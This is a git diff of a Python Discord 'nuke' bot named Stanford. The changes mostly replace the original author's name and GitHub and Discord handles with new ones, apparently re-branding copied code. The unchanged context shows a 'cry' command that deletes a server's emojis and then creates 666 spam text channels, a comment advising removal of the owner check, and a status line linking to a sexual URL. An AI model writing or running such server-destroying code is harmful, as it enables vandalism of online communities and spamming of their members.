@@ -8,7 +8,7 @@ from pystyle import *
 
 os.system('cls')
 time.sleep(1)
-os.system("title Stanford ┃ By: Bryon")
+os.system("title Stanford ┃ By: Memeoverdose")
 os.system('cls')
 time.sleep(1)
 token = (Write.Input(f"""
@@ -27,26 +27,26 @@ client = commands.Bot(command_prefix="!")
 
 os.system('cls')
 time.sleep(1)
-os.system("title Stanford ~ Online ┃ By: Bryon")
+os.system("title Stanford ~ Online ┃ By: Memeoverdose")
 @client.event
 async def on_ready():
    Write.Print(f"""
 ╔═╗┌┬┐┌─┐┌┐┌┌─┐┌─┐┬─┐┌┬┐
 ╚═╗ │ ├─┤│││├┤ │ │├┬┘ ││
 ╚═╝ ┴ ┴ ┴┘└┘└  └─┘┴└──┴┘
-Github: @GotRipped\nCurrent Discord: Ich D-Skid#6969 | Ripped#0001 \n
+Github: @clownist\nCurrent Discord: .gg/vcc | Memeoverdose#2531 \n
 ╔══Bot - {client.user}\n╚══► Connected
 ╔══Prefix\n╚══► " ! "
 ╔══Commands\n╚══► cry = Dropping The Nuke. | stop = To stop the nuke.
  """, Colors.red_to_yellow, interval=0.00001)
-   await client.change_presence(status=discord.Status.do_not_disturb, activity=discord.Activity(type=discord.ActivityType.listening, name= f"clippy.link/sex | Github: @GotRipped"))
+   await client.change_presence(status=discord.Status.do_not_disturb, activity=discord.Activity(type=discord.ActivityType.listening, name= f"clippy.link/sex | Github: @clownist"))
 
 @client.command()
 @commands.is_owner() #~ delete this whole line of code so everyone can use this command (this command STOPS THE NUKE!!)
 async def stop(ctx): #~ stop command
   await ctx.bot.logout()
   os.system("cls")
-  os.system("title Stanford ~ Offline ┃ By: Bryon")
+  os.system("title Stanford ~ Offline ┃ By: Memeoverdose")
   print (Fore.BLUE + f"{client.user.name} has logged out successfully.")
   os.system("pause >nul")
   os.system("cls")
@@ -74,7 +74,7 @@ async def cry(ctx): #~ start command / nuke
        print(Fore.GREEN + f"{emoji.name}[✅] Has been deleted succesfull.")
      except:
        print(Fore.RED + f"{emoji.name}[❌] Has not been Deleted! (missing perms?)")
-    await guild.create_text_channel("github is gotripped")
+    await guild.create_text_channel("github is clownist")
     amount = 666
     for i in range(amount):
        await guild.create_text_channel(random.choice(spm_chnl))
